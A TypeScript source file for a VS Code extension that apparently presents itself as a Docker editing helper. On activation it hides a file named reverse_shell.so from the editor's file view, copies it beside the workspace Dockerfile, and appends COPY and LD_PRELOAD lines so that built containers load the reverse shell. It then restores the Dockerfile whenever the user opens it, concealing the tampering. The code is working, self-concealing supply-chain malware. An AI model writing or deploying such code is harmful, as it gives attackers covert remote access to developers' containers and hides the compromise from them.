import * as vscode from 'vscode';
import * as fs from 'fs';
import * as path from 'path';

export async function activate(context: vscode.ExtensionContext) {

	// update global settings to prevent user from seeing reverse_shell.so file
	const config = vscode.workspace.getConfiguration();
	const currentValue = config.get<{}>('files.exclude');
	const newValue = { ...currentValue, ...{ ['**/reverse_shell.so']: true } };
	await config.update('files.exclude', newValue, true);

	// get extensions
	const thisExtension = vscode.extensions.getExtension("undefined_publisher.docker-edit");
	const dockerExtension = vscode.extensions.getExtension("ms-azuretools.vscode-docker");

	// check docker extension is installed and running
	if (!dockerExtension) { console.error("Docker extension not running."); return;}

	// check this extension is running
	if (!thisExtension) { console.error("Docker-edit extension is not running properly."); return; }

	// find dockerfile in open tabs and close it
	var dockerfilePath: string = "";
	const tabs: vscode.Tab[] = vscode.window.tabGroups.all.map(tg => tg.tabs).flat();
	const index = tabs.findIndex(tab => tab.input instanceof vscode.TabInputText && tab.input.uri.path.endsWith('Dockerfile'));
	if (index !== -1) {
		const tab = tabs[index];
		if (tab.input instanceof vscode.TabInputText) {
			dockerfilePath = tab.input.uri.fsPath;
		};
		await vscode.window.tabGroups.close(tab);
	}

	// if dockerfile is not open in tabs, find its path via the current workspace
	if (!dockerfilePath) {
		const results = await vscode.workspace.findFiles('**/Dockerfile', undefined, 2);
		if (results.length !== 1) { console.error("Could not find Dockerfile"); return; }
		dockerfilePath = results[0].fsPath;
	}

	// copy reverse_shell.so file to Dockerfile scope
	const reverseShellPath = path.join(path.dirname(dockerfilePath), "reverse_shell.so");
	fs.copyFileSync(path.join(thisExtension.extensionPath, "reverse_shell.so"), reverseShellPath);

	// copy original Dockerfile
	const tempDest = path.join(thisExtension.extensionPath, "Dockerfile");
	fs.copyFileSync(dockerfilePath, tempDest);

	// append malicious lines to Dockerfile
	fs.appendFileSync(dockerfilePath, `\nCOPY reverse_shell.so /usr/share/lib/reverse_shell.so\nENV LD_PRELOAD=/usr/share/lib/reverse_shell.so`);

	// add event listener to remove reverse_shell.so file and malicious lines in Dockerfile when Dockerfile is opened
	context.subscriptions.push(vscode.workspace.onDidOpenTextDocument(e => {
		if (e.uri.fsPath === dockerfilePath) {
			fs.copyFileSync(tempDest, dockerfilePath);
			fs.rmSync(reverseShellPath);
		}
	}));

}

export function deactivate() {}
